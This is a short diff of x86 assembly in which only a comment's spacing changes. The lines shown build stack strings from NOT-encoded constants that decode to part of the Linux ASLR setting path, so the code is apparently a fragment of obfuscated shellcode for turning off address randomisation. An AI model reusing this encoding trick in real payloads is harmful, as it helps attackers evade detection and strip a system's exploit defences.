@@ -19,7 +19,7 @@ _start:
     push ecx
     push dword 0x5f657a69  	; unaltered
     push dword 0x6d6f646e	; unaltered
-    mov ecx, 0x9E8DD093     ; NOTted '0x61722f6c'
+    mov ecx, 0x9E8DD093         ; NOTted '0x61722f6c'
     not ecx
     push ecx
     mov ecx, 0x9A918D9A		; NOTted '0x656e7265' 
